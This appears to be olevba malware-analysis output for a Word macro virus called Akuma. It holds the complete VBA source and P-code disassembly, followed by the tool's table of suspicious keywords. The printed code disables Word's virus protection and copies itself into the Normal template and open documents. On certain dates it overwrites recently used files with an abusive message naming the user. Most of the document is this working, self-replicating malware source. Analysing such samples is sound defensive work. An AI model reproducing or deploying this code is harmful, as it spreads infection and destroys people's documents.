olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Akuma
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Akuma - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Akuma
    On Error Resume Next
    stato = ActiveDocument.Saved
    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    Application.DisplayRecentFiles = True
    RecentFiles.Maximum = 9
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    db = AkumaClear(bry, "Private Sub Document_Close()")
    db = AkumaClear(bry, "Private Sub Document_Open()")
    db = AkumaClear(bry, "Private Function AkumaFind(DoveM, StartM)")
    db = AkumaClear(bry, "Private Function AkumaClear(DoveM, StartM)")
    db = AkumaClear(bry, "Private Function AkumaWrite(StartM)")
    db = AkumaClear(bry, "Private Function AkumaInfect()")
    db = AkumaClear(bry, "Sub Document_Close()")
    db = AkumaClear(bry, "Sub Document_Open()")
    Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
    db = AkumaClear(bry, "Private Sub Document_Close()")
    db = AkumaClear(bry, "Private Sub Document_Open()")
    db = AkumaClear(bry, "Private Function AkumaFind(DoveM, StartM)")
    db = AkumaClear(bry, "Private Function AkumaClear(DoveM, StartM)")
    db = AkumaClear(bry, "Private Function AkumaWrite(StartM)")
    db = AkumaClear(bry, "Private Function AkumaInfect()")
    db = AkumaClear(bry, "Sub Document_Close()")
    db = AkumaClear(bry, "Sub Document_Open()")
    SetAttr "c:\cont.dbl", vbNormal
    Kill "c:\cont.dbl"
    Open "c:\cont.dbl" For Output As #1
    db = AkumaWrite("Private Sub Document_Open()")
    db = AkumaWrite("Private Sub Document_Close()")
    db = AkumaWrite("Private Function AkumaFind(DoveM, StartM)")
    db = AkumaWrite("Private Function AkumaClear(DoveM, StartM)")
    db = AkumaWrite("Private Function AkumaWrite(StartM)")
    db = AkumaWrite("Private Function AkumaInfect()")
    Close #1
    SetAttr "c:\cont.dbl", vbNormal
    AkumaInfect
    Kill "c:\cont.dbl"
    Randomize
    If Int((6 * Rnd) + 1) < 3 Then
        With Dialogs(wdDialogFileSummaryInfo)
            .Title = "Akuma Macro Carrier"
            .Author = "Akuma"
            .Keywords = "Mary Bitch"
            .Execute
        End With
    End If
    If Left(ActiveDocument.Name, 8) <> "Document" Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
    ActiveDocument.Saved = stato
    On Error GoTo 0
End Sub

Private Sub Document_Close()
'Akuma
    On Error Resume Next
    If Day(Date) >= 16 And Day(Date) <= 18 Then
        If Dir("c:\mary.log", vbArchive + vbHidden + vbReadOnly) = "" Then
            For c = 1 To Application.RecentFiles.Count
                If Left(Application.RecentFiles.Item(c).Path, 3) <> "A:\" Then
                    Open Application.RecentFiles.Item(c).Path + "\" + Application.RecentFiles.Item(c) For Output As #1
                    Print #1, "Something wonderful has happened, your PC is alive and even better but some of your documents are infected by the Akuma virus." + Chr$(10) + "Mary is simply a bitch and you, " + Application.UserName + ", are a stupid jerk and lose some files." + Chr$(10) + "Have a nice day."
                    Close #1
                End If
            Next c
        Else
            MsgBox "Something wonderful has happened, your PC is alive and even better but some of your documents are infected by the Akuma virus." + Chr$(10) + "Mary is simply a bitch and you, " + Application.UserName + ", are a stupid jerk and lose some files." + Chr$(10) + "Have a nice day."
        End If
    End If
End Sub

Private Function AkumaFind(DoveM, StartM)
'Akuma
    flagaltro = False
    flagio = False
    For Count = 1 To DoveM.CodeModule.CountOfLines
        If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then
            flagaltro = True
            flagio = False
            If Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Akuma" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next Count
    If flagaltro = True Then
        For Count = 1 To DoveM.CodeModule.CountOfLines
            If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then Exit For
        Next Count
        AkumaFind = Count
    Else
        If flagio = False Then
            AkumaFind = "Akuma"
        End If
        If flagio = True Then
            AkumaFind = "Akuma Yes" + Str(Count)
        End If
    End If
End Function

Private Function AkumaClear(DoveM, StartM)
'Akuma
    Count = AkumaFind(DoveM, StartM)
    If Count <> "Akuma" And Count <> "Akuma Yes" Then
        Do Until DoveM.CodeModule.Lines(Count, 1) = "End Sub" Or DoveM.CodeModule.Lines(Count, 1) = "End Function"
            DoveM.CodeModule.DeleteLines (Count)
        Loop
        DoveM.CodeModule.DeleteLines (Count)
    End If
End Function

Private Function AkumaWrite(StartM)
'Akuma
    Count = AkumaFind(MacroContainer.VBProject.VBComponents.Item(1), StartM)
    If Count <> "Akuma" Then
        If Left(Count, Len("Akuma Yes")) = "Akuma Yes" Then
            Count = Val(Right(Count, Len(Count) - Len("Akuma Yes")))
        End If
        Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Sub" Or MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Function"
            stress = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
            Print #1, stress
            Count = Count + 1
        Loop
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
        Print #1, ""
    End If
End Function

Private Function AkumaInfect()
'Akuma
    If AkumaFind(NormalTemplate.VBProject.VBComponents.Item(1), "Private Sub Document_Open()") = "Akuma" Then
        Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
        flag = True
    ElseIf AkumaFind(ActiveDocument.VBProject.VBComponents.Item(1), "Private Sub Document_Open()") = "Akuma" Then
        Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
        flag = True
    Else
        flag = False
    End If
    If flag = True Then
        Open "c:\cont.dbl" For Input As #2
        If LOF(2) = 0 Then GoTo cpyvir
        Count = 1
        Do While Not EOF(2)
            Line Input #2, stress
            bry.CodeModule.InsertLines Count, stress
            Count = Count + 1
        Loop
cpyvir: Close #2
    End If
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Akuma
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10210 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	QuoteRem 0x0000 0x0005 "Akuma"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St stato 
' Line #4:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #5:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #6:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #7:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #8:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #9:
' 	EndWith 
' Line #10:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #11:
' 	LitDI2 0x0009 
' 	Ld RecentFiles 
' 	MemSt Maximum 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #13:
' 	Ld bry 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #14:
' 	Ld bry 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #15:
' 	Ld bry 
' 	LitStr 0x0029 "Private Function AkumaFind(DoveM, StartM)"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #16:
' 	Ld bry 
' 	LitStr 0x002A "Private Function AkumaClear(DoveM, StartM)"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #17:
' 	Ld bry 
' 	LitStr 0x0023 "Private Function AkumaWrite(StartM)"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #18:
' 	Ld bry 
' 	LitStr 0x001E "Private Function AkumaInfect()"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #19:
' 	Ld bry 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #20:
' 	Ld bry 
' 	LitStr 0x0013 "Sub Document_Open()"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #22:
' 	Ld bry 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #23:
' 	Ld bry 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #24:
' 	Ld bry 
' 	LitStr 0x0029 "Private Function AkumaFind(DoveM, StartM)"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #25:
' 	Ld bry 
' 	LitStr 0x002A "Private Function AkumaClear(DoveM, StartM)"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #26:
' 	Ld bry 
' 	LitStr 0x0023 "Private Function AkumaWrite(StartM)"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #27:
' 	Ld bry 
' 	LitStr 0x001E "Private Function AkumaInfect()"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #28:
' 	Ld bry 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #29:
' 	Ld bry 
' 	LitStr 0x0013 "Sub Document_Open()"
' 	ArgsLd AkumaClear 0x0002 
' 	St db 
' Line #30:
' 	LitStr 0x000B "c:\cont.dbl"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #31:
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' Line #32:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #33:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	ArgsLd AkumaWrite 0x0001 
' 	St db 
' Line #34:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	ArgsLd AkumaWrite 0x0001 
' 	St db 
' Line #35:
' 	LitStr 0x0029 "Private Function AkumaFind(DoveM, StartM)"
' 	ArgsLd AkumaWrite 0x0001 
' 	St db 
' Line #36:
' 	LitStr 0x002A "Private Function AkumaClear(DoveM, StartM)"
' 	ArgsLd AkumaWrite 0x0001 
' 	St db 
' Line #37:
' 	LitStr 0x0023 "Private Function AkumaWrite(StartM)"
' 	ArgsLd AkumaWrite 0x0001 
' 	St db 
' Line #38:
' 	LitStr 0x001E "Private Function AkumaInfect()"
' 	ArgsLd AkumaWrite 0x0001 
' 	St db 
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #40:
' 	LitStr 0x000B "c:\cont.dbl"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #41:
' 	ArgsCall AkumaInfect 0x0000 
' Line #42:
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' Line #43:
' 	ArgsCall Read 0x0000 
' Line #44:
' 	LitDI2 0x0006 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0003 
' 	Lt 
' 	IfBlock 
' Line #45:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #46:
' 	LitStr 0x0013 "Akuma Macro Carrier"
' 	MemStWith Title 
' Line #47:
' 	LitStr 0x0005 "Akuma"
' 	MemStWith Author 
' Line #48:
' 	LitStr 0x000A "Mary Bitch"
' 	MemStWith Keywords 
' Line #49:
' 	ArgsMemCallWith Execute 0x0000 
' Line #50:
' 	EndWith 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #53:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Ld stato 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #56:
' 	OnError (GoTo 0) 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Private Sub Document_Close())
' Line #60:
' 	QuoteRem 0x0000 0x0005 "Akuma"
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Ge 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0012 
' 	Le 
' 	And 
' 	IfBlock 
' Line #63:
' 	LitStr 0x000B "c:\mary.log"
' 	Ld vbArchive 
' 	Ld vbHidden 
' 	Add 
' 	Ld vbReadOnly 
' 	Add 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #64:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	MemLd Count 
' 	For 
' Line #65:
' 	Ld c 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "A:\"
' 	Ne 
' 	IfBlock 
' Line #66:
' 	Ld c 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld c 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	ArgsMemLd Item 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007E "Something wonderful has happened, your PC is alive and even better but some of your documents are infected by the Akuma virus."
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0020 "Mary is simply a bitch and you, "
' 	Add 
' 	Ld Application 
' 	MemLd UserName 
' 	Add 
' 	LitStr 0x0028 ", are a stupid jerk and lose some files."
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0010 "Have a nice day."
' 	Add 
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	ElseBlock 
' Line #72:
' 	LitStr 0x007E "Something wonderful has happened, your PC is alive and even better but some of your documents are infected by the Akuma virus."
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0020 "Mary is simply a bitch and you, "
' 	Add 
' 	Ld Application 
' 	MemLd UserName 
' 	Add 
' 	LitStr 0x0028 ", are a stupid jerk and lose some files."
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0010 "Have a nice day."
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' 	FuncDefn (Private Function AkumaFind(DoveM, StartM, id_FFFE As Variant))
' Line #78:
' 	QuoteRem 0x0000 0x0005 "Akuma"
' Line #79:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #80:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #81:
' 	StartForVariable 
' 	Ld Count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #82:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd LCase$ 0x0001 
' 	Ld StartM 
' 	ArgsLd LCase$ 0x0001 
' 	Eq 
' 	IfBlock 
' Line #83:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #84:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #85:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0006 "'Akuma"
' 	Eq 
' 	IfBlock 
' Line #86:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #87:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #88:
' 	ExitFor 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	StartForVariable 
' 	Ld Count 
' 	EndForVariable 
' 	NextVar 
' Line #92:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #93:
' 	StartForVariable 
' 	Ld Count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #94:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd LCase$ 0x0001 
' 	Ld StartM 
' 	ArgsLd LCase$ 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #95:
' 	StartForVariable 
' 	Ld Count 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	Ld Count 
' 	St AkumaFind 
' Line #97:
' 	ElseBlock 
' Line #98:
' 	Ld flagio 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #99:
' 	LitStr 0x0005 "Akuma"
' 	St AkumaFind 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	Ld flagio 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LitStr 0x0009 "Akuma Yes"
' 	Ld Count 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St AkumaFind 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	EndFunc 
' Line #106:
' Line #107:
' 	FuncDefn (Private Function AkumaClear(DoveM, StartM, id_FFFE As Variant))
' Line #108:
' 	QuoteRem 0x0000 0x0005 "Akuma"
' Line #109:
' 	Ld DoveM 
' 	Ld StartM 
' 	ArgsLd AkumaFind 0x0002 
' 	St Count 
' Line #110:
' 	Ld Count 
' 	LitStr 0x0005 "Akuma"
' 	Ne 
' 	Ld Count 
' 	LitStr 0x0009 "Akuma Yes"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #111:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "End Function"
' 	Eq 
' 	Or 
' 	DoUnitil 
' Line #112:
' 	Ld Count 
' 	Paren 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #113:
' 	Loop 
' Line #114:
' 	Ld Count 
' 	Paren 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	EndFunc 
' Line #117:
' Line #118:
' 	FuncDefn (Private Function AkumaWrite(StartM, id_FFFE As Variant))
' Line #119:
' 	QuoteRem 0x0000 0x0005 "Akuma"
' Line #120:
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Ld StartM 
' 	ArgsLd AkumaFind 0x0002 
' 	St Count 
' Line #121:
' 	Ld Count 
' 	LitStr 0x0005 "Akuma"
' 	Ne 
' 	IfBlock 
' Line #122:
' 	Ld Count 
' 	LitStr 0x0009 "Akuma Yes"
' 	FnLen 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "Akuma Yes"
' 	Eq 
' 	IfBlock 
' Line #123:
' 	Ld Count 
' 	Ld Count 
' 	FnLen 
' 	LitStr 0x0009 "Akuma Yes"
' 	FnLen 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St Count 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "End Function"
' 	Eq 
' 	Or 
' 	DoUnitil 
' Line #126:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St stress 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld stress 
' 	PrintItemNL 
' Line #128:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #129:
' 	Loop 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	EndFunc 
' Line #134:
' Line #135:
' 	FuncDefn (Private Function AkumaInfect(id_FFFE As Variant))
' Line #136:
' 	QuoteRem 0x0000 0x0005 "Akuma"
' Line #137:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	ArgsLd AkumaFind 0x0002 
' 	LitStr 0x0005 "Akuma"
' 	Eq 
' 	IfBlock 
' Line #138:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #139:
' 	LitVarSpecial (True)
' 	St flag 
' Line #140:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	ArgsLd AkumaFind 0x0002 
' 	LitStr 0x0005 "Akuma"
' 	Eq 
' 	ElseIfBlock 
' Line #141:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #142:
' 	LitVarSpecial (True)
' 	St flag 
' Line #143:
' 	ElseBlock 
' Line #144:
' 	LitVarSpecial (False)
' 	St flag 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	Ld flag 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #147:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #148:
' 	LitDI2 0x0002 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpyvir 
' 	EndIf 
' Line #149:
' 	LitDI2 0x0001 
' 	St Count 
' Line #150:
' 	LitDI2 0x0002 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #151:
' 	LitDI2 0x0002 
' 	Ld stress 
' 	LineInput 
' Line #152:
' 	Ld Count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #153:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #154:
' 	Loop 
' Line #155:
' 	Label cpyvir 
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	EndFunc 
' Line #158:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

